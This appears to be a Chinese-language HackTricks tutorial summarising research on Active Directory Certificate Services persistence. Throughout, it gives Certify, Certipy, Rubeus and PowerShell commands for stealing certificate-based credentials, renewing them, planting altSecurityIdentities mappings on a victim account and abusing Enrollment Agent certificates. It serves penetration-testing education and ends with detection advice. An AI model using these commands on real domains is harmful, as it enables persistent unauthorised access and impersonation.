# AD CS 账户持久化

{{#include ../../../banners/hacktricks-training.md}}

**这是对 [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) 中优秀研究的账户持久化章节所做的简要总结**<sup>[[7]](#references)</sup>

## 使用证书窃取活动用户凭据 – PERSIST1

在某种场景中，如果用户可以请求允许进行域身份验证的证书，攻击者便有机会请求并窃取该证书，以在网络中维持持久化。默认情况下，Active Directory 中的 `User` 模板允许此类请求，但有时可能会被禁用。<sup>[[3]](#references)[[7]](#references)</sup>

使用 [Certify](https://github.com/GhostPack/Certify) 或 [Certipy](https://github.com/ly4k/Certipy)，你可以搜索允许客户端身份验证的已启用模板，然后请求一个：
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
证书的强大之处在于，只要证书仍然有效，无论密码是否更改，都可以使用它以证书所属用户的身份进行身份验证。

你可以将 PEM 转换为 PFX，并使用它获取 TGT：
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> 注意：结合其他 techniques（参见 THEFT sections），基于 certificate 的 auth 可以在不接触 LSASS 的情况下，甚至从 non-elevated contexts 中实现持久访问。

## 使用 Certificates 获取 Machine Persistence - PERSIST2

如果 attacker 在某个主机上拥有 elevated privileges，就可以使用默认的 `Machine` template 为受 compromise 的系统 machine account enroll 一个 certificate。以该 machine 身份进行 auth 可为 local services 启用 S4U2Self，并提供持久的 host persistence：<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## 通过证书续订扩展持久化 - PERSIST3

滥用证书模板的有效期和续订期限，可以让攻击者维持长期访问权限。如果你拥有之前签发的证书及其私钥，就可以在证书过期前续订它，从而获得一个全新的长期有效凭据，而不会留下与原始 principal 相关的额外请求痕迹。<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> 操作提示：跟踪攻击者持有的 PFX 文件生命周期，并提前续期。续期还可能使更新后的证书包含现代 SID 映射扩展，从而在更严格的 DC 映射规则下保持可用（见下一节）。

## 植入显式证书映射（altSecurityIdentities）– PERSIST4

如果你可以写入目标账户的 `altSecurityIdentities` 属性，就可以将攻击者控制的证书显式映射到该账户。这种持久化方式不受密码更改影响，并且在使用强映射格式时，在现代 DC 强制规则下仍然有效。<sup>[[2]](#references)</sup>

高级流程：

1. 获取或签发一个由你控制的客户端身份验证证书（例如，以自己的身份注册 `User` 模板）。
2. 从证书中提取强标识符（Issuer+Serial、SKI 或 SHA1-PublicKey）。
3. 使用该标识符，在受害者主体的 `altSecurityIdentities` 上添加显式映射。
4. 使用你的证书进行身份验证；DC 会通过显式映射将其映射到受害者。

使用强 Issuer+Serial 映射的示例（PowerShell）：
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
然后使用你的 PFX 进行身份验证。Certipy 将直接获取 TGT：
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### 构建强 `altSecurityIdentities` 映射

在实践中，**Issuer+Serial** 和 **SKI** 映射是使用攻击者持有的证书构建强映射的最简单格式。这一点在 **2025 年 2 月 11 日**之后尤为重要，因为 DC 默认进入 **Full Enforcement**，而弱映射将不再可靠。<sup>[[1]](#references)</sup>
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
注意事项
- 仅使用强映射类型：`X509IssuerSerialNumber`、`X509SKI` 或 `X509SHA1PublicKey`。弱格式（Subject/Issuer、仅 Subject、RFC822 email）已弃用，并且可能会被 DC 策略阻止。
- 该映射同时适用于 **user** 和 **computer** 对象，因此，只要拥有对计算机帐户 `altSecurityIdentities` 的写入权限，就足以持久化为该计算机。
- 证书链必须构建到 DC 信任的根证书。通常，NTAuth 中的 Enterprise CA 受信任；某些环境也会信任公共 CA。
- 即使 PKINIT 失败，Schannel authentication 对持久化仍然有用，因为 DC 可能缺少 Smart Card Logon EKU，或返回 `KDC_ERR_PADATA_TYPE_NOSUPP`。

#### 2025+ `Issuer/SID` 显式映射

在安装了 **2025 年 9 月 9 日** 安全更新的 **Windows Server 2022+** 域控制器上，Microsoft 新增了另一种强显式映射格式。由于该格式在从同一 CA 重新签发证书后仍然有效，因此对持久化很有吸引力：<sup>[[6]](#references)</sup>
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
在实际操作上，这与较旧的强格式有所不同：
- `Issuer+Serial` 固定 **一个完全匹配的证书**。
- `SKI` / `SHA1-PUKEY` 固定 **一个密钥对**。
- `Issuer/SID` 固定 **签发 CA + 目标 SID**，因此来自同一 CA 的续期或重新签发证书仍可继续工作，无需重写 `altSecurityIdentities`。

要求和注意事项
- 用于登录的证书必须在 SID security extension 中实际包含目标账户 SID。
- 此格式对省略 SID extension 的 `ESC9` / `ESC16` 类型证书没有帮助；在这些情况下，应改用 `Issuer+Serial`、`SKI` 或 `SHA1-PUKEY`。

如需了解更多关于弱显式映射和攻击路径的信息，请参阅：


{{#ref}}
domain-escalation.md
{{#endref}}

## 将 Enrollment Agent 作为 Persistence – PERSIST5

如果你获得了有效的 Certificate Request Agent/Enrollment Agent 证书，就可以随时代表用户创建新的、支持登录的证书，并将 agent PFX 离线保存，作为 persistence token。Abuse workflow：<sup>[[7]](#references)</sup>
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
撤销 agent certificate 或 template permissions 是清除此 persistence 所必需的。

操作注意事项
- Modern `Certipy` versions support both `-on-behalf-of` and `-renew`，因此持有 Enrollment Agent PFX 的攻击者无需再次接触原始目标账户，即可签发并随后续期 leaf certificates。<sup>[[4]](#references)</sup>
- 如果无法通过 PKINIT 获取 TGT，生成的 on-behalf-of certificate 仍可用于基于 Schannel 的 authentication，命令为 `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`。<sup>[[5]](#references)</sup>

## PKINIT 失败时使用已持久化的 Certificates

如果 DC 没有具备 Smart Card Logon 能力的 certificate，则通过 PKINIT 进行 certificate logon 可能会失败，并返回 `KDC_ERR_PADATA_TYPE_NOSUPP`。这**不会**摧毁该 persistence primitive：同一个 PFX 通常仍可用于经过 Schannel authentication 的 LDAP access。<sup>[[5]](#references)</sup>
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
这在 PERSIST4/PERSIST5 之后尤其有用，因为你可以继续从 Linux/macOS 进行操作，并串联其他目录持久化操作，例如植入 [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) 或编辑可写的委派属性。

## 2025 Strong Certificate Mapping Enforcement：对持久化的影响

Microsoft KB5014754 在域控制器上引入了 Strong Certificate Mapping Enforcement。自 **2025 年 2 月 11 日** 起，DC 对弱映射/歧义映射默认采用 **Full Enforcement**；截至 **2025 年 9 月 9 日** 的安全更新，已修补的 DC 不再支持旧的 Compatibility-mode fallback。<sup>[[1]](#references)</sup> 实际影响如下：

- 缺少 SID mapping extension 的 2022 年之前证书，在 DC 处于 Full Enforcement 时，可能无法进行 implicit mapping。攻击者可以通过 AD CS 续订证书来维持访问权限（从而获取 SID extension），或者在 `altSecurityIdentities` 中植入 strong explicit mapping（PERSIST4）。
- 使用 strong formats（`Issuer+Serial`、`SKI`、`SHA1-PUKEY`，以及现代 DC 上的 `Issuer/SID`）的 explicit mappings 仍可继续工作。Weak formats（Issuer/Subject、Subject-only、RFC822）可能会被阻止，不应将其用于持久化。
- 如果 weak mappings 仍然有效，应假设你遇到的是未打补丁或配置不同的 DC，而不是将其视为可靠的长期持久化路径。
- `ESC9` / `ESC16` 风格的 issuance paths 会抑制 SID extension，使 `Issuer/SID` 无法使用；因此，fallback strong mappings 或通过普通模板续订证书，将成为实际可行的持久化选项。

管理员应监控并对以下活动发出告警：
- `altSecurityIdentities` 的变更，以及 Enrollment Agent 和 User certificates 的签发/续订。
- CA issuance logs 中的 on-behalf-of requests 和异常续订模式。

## 参考资料

- [1] [Microsoft Support – KB5014754：Windows 域控制器上的基于证书的身份验证变更](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [3] [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [4] [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [5] [Almond Offensive Security – Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [6] [Microsoft Community Hub – Introducing a new Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)
- [7] [SpecterOps – Certified Pre-Owned: Abusing Active Directory Certificate Services](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)

{{#include ../../../banners/hacktricks-training.md}}
